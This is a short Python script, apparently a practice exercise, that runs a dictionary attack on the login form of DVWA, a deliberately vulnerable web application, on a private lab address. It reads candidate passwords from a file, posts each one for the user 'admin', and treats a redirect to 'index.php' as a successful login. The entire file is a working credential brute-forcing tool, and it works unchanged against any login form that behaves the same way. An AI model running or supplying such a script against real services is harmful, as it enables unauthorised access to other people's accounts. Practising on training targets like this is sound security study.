# conding:utf-8

import requests
from bs4 import BeautifulSoup

url = "http://192.168.35.134/dvwa/login.php"

file = open("password.txt","r")
#if file == 0:
	#print ("打开错误")
	#return
for line in file:
	password = line.strip()
	#print (line)
	r = requests.post(url,allow_redirects=False,data={"username":'admin',"password":password,'Login':""})
	#soup = BeautifulSoup(r.content,"lxml")
	#print (soup,r.status_code)
	if r.headers['Location'] == "index.php":
		print ("登录成功","密码:" + password)
		exit()
	else:
		print (r.headers['Location'])
